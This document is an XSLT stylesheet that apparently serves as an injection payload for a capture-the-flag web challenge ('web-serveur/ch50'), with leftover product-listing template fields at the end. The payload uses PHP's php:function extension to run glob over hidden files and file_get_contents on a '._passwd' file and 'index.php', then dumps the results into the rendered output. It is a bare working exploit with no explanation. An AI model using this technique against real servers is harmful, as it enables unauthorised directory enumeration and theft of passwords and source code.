<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:php="http://php.net/xsl"              
>	
<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/._pa*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/._pb*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/._pc*')" disable-output-escaping="yes"/>
<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/._pd*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/._pe*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/._pf*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/._pg*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/._ph*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/._pi*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/._pj*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/._pk*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/._pl*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/._pm*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/._pn*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/._po*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/._pp*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/._pq*')" disable-output-escaping="yes"/>
<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/._pr*')" disable-output-escaping="yes"/>
<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/._ps*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/._pt*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/._pu*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/._pv*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/._pw*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/._px*')" disable-output-escaping="yes"/>
<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/._py*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/._pz*')" disable-output-escaping="yes"/>
<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._p_*')" disable-output-escaping="yes"/>

<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/._passwd')" disable-output-escaping="yes"/> 
<xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
<xsl:template match="/">	
  SCANDIR0 ._pa*:<xsl:value-of select="$shandlea"/> 
  SCANDIR0 .b*:<xsl:value-of select="$shandleb"/> 
  SCANDIR0 .c*:<xsl:value-of select="$shandlec"/> 
  SCANDIR0 .d*:<xsl:value-of select="$shandled"/> 
  SCANDIR0 .e*:<xsl:value-of select="$shandlee"/>  
  SCANDIR0 .f*:<xsl:value-of select="$shandlef"/> 
  SCANDIR0 .g*:<xsl:value-of select="$shandleg"/> 
  SCANDIR0 .h*:<xsl:value-of select="$shandleh"/> 
  SCANDIR0 .i*:<xsl:value-of select="$shandlei"/> 
  SCANDIR0 .j*:<xsl:value-of select="$shandlej"/>   
  SCANDIR0 .k*:<xsl:value-of select="$shandlek"/> 
  SCANDIR0 .l*:<xsl:value-of select="$shandlel"/> 
  SCANDIR0 .m*:<xsl:value-of select="$shandlem"/> 
  SCANDIR0 .n*:<xsl:value-of select="$shandlen"/> 
  SCANDIR0 .o*:<xsl:value-of select="$shandleo"/>  
  SCANDIR0 .p*:<xsl:value-of select="$shandlep"/> 
  SCANDIR0 .q*:<xsl:value-of select="$shandleq"/> 
  SCANDIR0 .r*:<xsl:value-of select="$shandler"/> 
  SCANDIR0 .s*:<xsl:value-of select="$shandles"/> 
  SCANDIR0 .t*:<xsl:value-of select="$shandlet"/> 
  SCANDIR0 .u*:<xsl:value-of select="$shandleu"/> 
  SCANDIR0 .v*:<xsl:value-of select="$shandlev"/> 
  SCANDIR0 .w*:<xsl:value-of select="$shandlew"/> 
  SCANDIR0 .x*:<xsl:value-of select="$shandlex"/> 
  SCANDIR0 .y*:<xsl:value-of select="$shandley"/>  
  SCANDIR0 .z*:<xsl:value-of select="$shandlez"/>
  SCANDIR0 ._*:<xsl:value-of select="$shandle_"/>   
 PHPINFO:<xsl:value-of select="$strscand"/>     
 DIR1 index.php:<xsl:value-of select="$header"/>   
<xsl:value-of select="name"/>
 <div style="background-color:teal;color:white;padding:4px">
<span style="font-weight:bold">
-
</span>
<xsl:value-of select="price"/>
</div>
<div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
<p>
<xsl:value-of select="description"/>
<span style="font-style:italic">
(
<xsl:value-of select="prct"/>
%)
</span>
</p>
</div>
</xsl:template>
</xsl:stylesheet>
